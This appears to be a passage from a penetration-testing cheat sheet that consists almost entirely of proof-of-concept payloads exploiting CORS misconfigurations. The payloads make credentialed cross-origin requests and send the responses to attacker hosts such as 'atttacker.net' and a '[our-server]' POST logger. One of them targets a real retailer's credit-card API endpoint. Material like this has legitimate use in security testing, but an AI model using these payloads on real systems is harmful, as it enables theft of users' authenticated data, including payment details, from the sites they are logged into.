- Proof of concept

```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```
or

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

> HTML Embeded CORS


```html
<html>
	<head>
		<title>TrustedSec CORS POC</title>
	</head>
	<body>
		<h1>TrustedSec CORS POC</h>
		<script>
			var crossoriginget = new XMLHttpRequest();
			//The target site with the bad CORS configuration
			var url = 'https://[target-site/target-page]';
			crossoriginget.open('GET', url, true);
			/*  This tells the browser to send the request with cookies;
			    requires “Access-Control-Allow-Credentials = true” in
			    response headers for this.responseText to be readable.  */
			crossoriginget.withCredentials = true;
			crossoriginget.onload = reqListener;
			crossoriginget.send();
			/*  Once the cross-origin request completes, attempt to read the
			    response text and send it to the malicious server using an
			    HTTP POST request.  */
			function reqListener() {
				var exfiltraterequest = new XMLHttpRequest();
				//Our server hosting the CORS attack
				var maliciousurl = 'http://[our-server]:8000/cgi-bin/postlogger.py';
				exfiltraterequest.open('POST', maliciousurl);
				exfiltraterequest.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
				exfiltraterequest.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
			};
		</script>
	</body>
</html>

```


> CORS TEST Exploit

```javascript
<script>
    // Send a cross origin request to the walmart.com server, when a victim visits the page.
    var req = new XMLHttpRequest();
    req.open('GET',"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card",true);
    req.onload = stealData;
    req.withCredentials = true;
    req.send();

    function stealData(){
        //reading response is allowed because of the CORS misconfiguration.
        var data= JSON.stringify(JSON.parse(this.responseText),null,2);

        //display the data on the page. A real attacker can send the data to his server.
        output(data);
    }

    function output(inp) {
        document.body.appendChild(document.createElement('pre')).innerHTML = inp;
    }
</script>
```